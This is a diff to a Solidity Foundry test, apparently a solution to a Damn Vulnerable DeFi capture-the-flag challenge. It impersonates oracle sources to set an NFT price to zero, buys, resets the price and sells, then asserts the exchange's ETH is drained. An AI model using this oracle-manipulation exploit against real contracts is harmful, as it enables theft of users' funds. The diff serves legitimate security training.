@@ -40,7 +40,7 @@ contract TestAttack is Test{
         initializer = new TrustfulOracleInitializer(sources, strings, numbers);
         oracle = initializer.oracle();
         exchange = new Exchange{value: INITIAL_EXCHANGE_ETH_BALANCE}(address(oracle));
-        attacker = new Attack();
+        attacker = new Attack(exchange, exchange.token());
 
         vm.deal(address(attacker), INITIAL_PLAYER_ETH_BALANCE);
     }
@@ -57,5 +57,19 @@ contract TestAttack is Test{
             oracle.postPrice("DVNFT", 0);
         }
         assertEq(oracle.getMedianPrice("DVNFT"), 0);
+
+        attacker.attack1();
+
+        for(uint256 i; i<3; i++){
+            vm.prank(sources[i]);
+            oracle.postPrice("DVNFT", INITIAL_EXCHANGE_ETH_BALANCE);
+        }
+        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_EXCHANGE_ETH_BALANCE);
+
+        attacker.attack2();
+
+        assertEq(address(exchange).balance, 0);
+        assertEq(exchange.token().balanceOf(address(attacker)), 0);
+        assertEq(address(attacker).balance, INITIAL_EXCHANGE_ETH_BALANCE + INITIAL_PLAYER_ETH_BALANCE);
     }
 }
